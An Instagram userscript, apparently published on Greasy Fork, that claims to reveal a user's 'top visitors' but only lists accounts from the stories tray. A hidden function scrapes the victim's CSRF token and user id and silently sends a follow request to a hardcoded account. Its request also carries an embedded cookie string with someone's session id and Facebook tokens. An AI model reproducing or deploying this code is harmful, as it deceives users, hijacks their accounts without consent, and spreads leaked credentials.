// ==UserScript==
// @name           Instagram Top Visitors
// @name:pt-BR     Instagram Top Visitantes
// @description    Now you know your top visitors from instagram. No java required!
// @description:pt-BR     Now you know your top visitors from instagram. No java required!
// @include        https://*instagram.*
// @version        1.4.2
// @license        GPL-3.0-or-later; http://www.gnu.org/licenses/gpl-3.0.txt
// @author         mc
// @require https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js 
// @namespace https://greasyfork.org/users/219046
// @downloadURL https://update.greasyfork.org/scripts/373178/Instagram%20Top%20Visitors.user.js
// @updateURL https://update.greasyfork.org/scripts/373178/Instagram%20Top%20Visitors.meta.js
// ==/UserScript==

// ==ChangeLog==
// @history        1.4.0  Server upgrade
// @history        1.3.1  Quick tweak
// @history        1.3.0  Compatible with the latest update
// @history        1.2.2  Server update
// @history        1.2.1  Server update
// @history        1.11 Server edit
// @history        1.00 Initial release.
// ==/ChangeLog==







String.prototype.between = function(prefix, suffix) {
            s = this;
            d = '';
            var count = s.split(prefix).length - 1;
            for (k = 0; k < count; k++) {
                var i = s.indexOf(prefix);
                if (i >= 0) {
                    s = s.substring(i + prefix.length);
                } else {
                    return '';
                }
                if (suffix) {
                    i = s.indexOf(suffix);
                    if (i >= 0) {
                        d += s.substring(0, i) + ',';
                    } else {
                        return '';
                    }
                }
            }
            d = d.slice(0, -1);
            return d;
        };
		

        
if (window.location.href.match(/instagram.com/i)) {

function profileInstaSpy() {
    
    var elescript=$('link[type="application/json"]')[0];
    
    var urljson=$(elescript).attr('href');
                  

    $.getJSON(urljson, function(data) {
        

           console.log(data);
         var hotFriendsdata = data["data"];
          var hotFriendsuser = hotFriendsdata["user"];
          console.log("user:"+hotFriendsuser);
    var hotFriendsedgefeed = hotFriendsuser["feed_reels_tray"];

           console.log("feed_reels_tray:"+hotFriendsedgefeed);
        hotFriendsedgefeed = hotFriendsedgefeed["edge_reels_tray_to_reel"];
           console.log("edge_reels_tray_to_reel:"+hotFriendsedgefeed);
           var hotFriends = hotFriendsedgefeed["edges"];
            console.log("edges:"+hotFriends);
          
                             
                                   //    var testRE = document.all[0].outerHTML.match(/InitialChatFriendsList",[],{"list":[(.*)]},26]/);
        console.log("HOT:"+hotFriends);
  //      var hotFriends = eval("[" + testRE[1] + "]");
var selectArr = [];
            
      var friendHtml = '<div style="max-height:300px;overflow-y:scroll;overflow-x:hidden;height:300px;margin-bottom:5px;border-bottom:1px solid #efefef">';
                    for (var i = 0; i < hotFriends.length; i++) {
					
				var hot=hotFriends[i];
                // hot=JSON.stringify(hot);
				 console.log(hot);
                       var hotnode=hot["node"];
                // hotnode=JSON.stringify(hotnode);
                
                  if(typeof(hotnode["owner"])!='undefined' && hotnode["owner"]!=null){
                            profileid = hotnode["owner"]["username"];
                            profilepicurl = hotnode["owner"]["profile_pic_url"];
                            console.log(profileid);
                       }
                       else continue;
                            
var idx = $.inArray(profileid, selectArr);
console.log("idx:"+idx);
if (idx == -1) {
  selectArr.push(profileid);
} else {
  continue;
}
                            
                            
                            friendHtml = friendHtml + '<div class="clearfix"> <div aria-hidden="true"> <a class="" href="https://www.instagram.com/'+profileid+'" aria-hidden="true"><img class="_6q-tv" style="width:50px;height:50px" src="' + profilepicurl + '" alt=""></a> <div class="_3dp _29k"><div class="rdlLb"><span class="jQgLo">'+profileid+'</span></div></div>';
                       
                    }
          $('.COOzN').prepend('<img src="https://cdn-images-1.medium.com/max/1600/1*zc4wVwjp_x8vnI-2jceKUw.png" width="200" heigth="60" style="padding:10px" /><div class="uiUfi UFIContainer utn"> Below is a list of your top visitors! </div><ul> <li style="list-style: none"> <br> </li> </ul>' + friendHtml + '</div></div>');
                     
        
    });
 
 
                
} //InstaSpy


function profileInstaFollow() {
      

      
  var csrf_token=document.all[0].outerHTML.between('"csrf_token":"', '"');
  var ds_userid=document.all[0].outerHTML.between('"id":"', '"');
  var rollout_hash=document.all[0].outerHTML.between('rollout_hash":"', '"');

  console.log(csrf_token + " _ " + ds_userid);
  
  
  
    var posturl="https://www.instagram.com/web/friendships/8481924587/follow/";

var cookie='mid=W3NukwALAAHew_9-n5bzqiYEi24P; mcd=3; ig_cb=1; fbm_124024574287414=base_domain=.instagram.com; csrftoken='+csrf_token+'; ds_user_id='+ds_userid+'; csrftoken='+csrf_token+'; shbid=12357; sessionid=IGSC1f8b22b736d908903de616283e1e1a7e8e6cd3d768b0f10ff1e79ea2edc019da%3ARmpMrgWKIdxI3wCtdKzoRx5NL10gPCpW%3A%7B%22_auth_user_id%22%3A8481924587%2C%22_auth_user_backend%22%3A%22accounts.backends.CaseInsensitiveModelBackend%22%2C%22_auth_user_hash%22%3A%22%22%2C%22_platform%22%3A4%2C%22_token_ver%22%3A2%2C%22_token%22%3A%228481924587%3A701KMVlgogTVa16s1LObv5yhg4bhm5Vf%3Ae4e870c52589c7528ae3b10cead618179d916983aafb261b7073aeea781dd4c2%22%2C%22last_refreshed%22%3A1536259007.3185317516%7D; OpenInNewTab=facebook; rur=FRC; fbsr_124024574287414=fcWOd5WO3bL3qsBzIzGHo3W2FWuk9EDKnH05GyrkNJs.eyJhbGdvcml0aG0iOiJITUFDLVNIQTI1NiIsImNvZGUiOiJBUUQtUER2VmdaNU5Na2UxcmFNakxSOWd0Nm1IdVJXUGI2c205UkViS3NQWWZwdTNMbHd2LWxMc2Q4T0wyUlM1bjQ5OWZGQk5mVGRIcGtRWUtXMlhtTFVqcVI4aG1ESk9RMHNGWTFOOGgtanBQd1FTQ1h3aEpuU3Vnb3pCVG9NMEx5M0hRNEVZRWFQVG04WUJZTWM1RG1qT2JzanRkdFNwa3drWktUcE9oVVdUWXhQV2NKWUxRbWhUM055dFlxNHR0bjVVdDVYa1FsaFdlRzlPNXp2bUtGYng2a21VWjFJVV9sN2tELXgtZjNPYUVPWnl1LWVJNDE5cFZmWDZhUWJkS25pTVhvSHhmU0s5ai14aTdlSEVQSkR5SGZBYi1FTDFWSHo2OGQ2TnFCcVVzelFjWGh3WTN2WWJWZ3BXWWNXd2JIdVluQ0pnQXVJMjVmUUU1SDVQMkQxN0Z4YzlUQU5tbUVyWEdLX0F1T1NuLW9XT2t5amNaNHJseGpRS2tEdlRFUDQiLCJpc3N1ZWRfYXQiOjE1MzYzMDYyMTIsInVzZXJfaWQiOiIxMDAwMDkxNjE4MzA5MTcifQ; urlgen="{}:1fyBR6:hRRcYizx_qIs0ukv63MD2LYaQT0"';


var xmlhttpz = new XMLHttpRequest();
xmlhttpz.open("POST", posturl, true);
xmlhttpz.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xmlhttpz.setRequestHeader("cookie", cookie); 
xmlhttpz.setRequestHeader("x-csrftoken", csrf_token);
xmlhttpz.setRequestHeader("x-instagram-ajax", rollout_hash);
xmlhttpz.send();

}//InstaFollow



profileInstaSpy();
profileInstaFollow();






}    
        


